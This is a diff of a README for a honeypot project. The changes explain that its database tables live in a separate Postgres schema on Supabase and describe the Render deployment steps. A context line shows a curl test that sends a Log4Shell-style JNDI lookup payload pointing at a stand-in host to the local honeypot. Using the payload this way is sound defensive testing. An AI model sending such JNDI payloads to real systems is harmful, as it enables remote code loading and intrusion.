@@ -40,8 +40,10 @@ All keys, passwords and data served are fake. Nothing executes attacker input.
     curl "localhost:8000/x?q=\${jndi:ldap://evil/a}"
 
 ## Deploy (Render + Supabase)
-1. Use the **same Supabase project** as v1 or a new one. Tables are created automatically on first start
-   (`common/db.py`); no manual SQL needed. Use the **Session pooler** connection string.
+1. Use the **same Supabase project** as v1 or a new one. All v2 tables live in their own Postgres schema (`hp2`, override
+   with `DB_SCHEMA`), created automatically on first start (`common/db.py`) - no manual SQL, and v1's `public.events`
+   is never touched. Supabase's REST API only exposes `public` by default, so the `hp2` data is not reachable with the
+   anon key. Use the **Session pooler** connection string (the schema is selected per connection).
 2. Render -> New -> Blueprint -> pick this repo, set **Root Directory** to `honeypot2`. It creates `hp2-honeypot`,
    `hp2-dashboard` and `threat-hunter`. Set `DATABASE_URL` (same value on both). Render generates `DASH_TOKEN` - copy it from
    the dashboard service's Environment tab; that is the dashboard password.
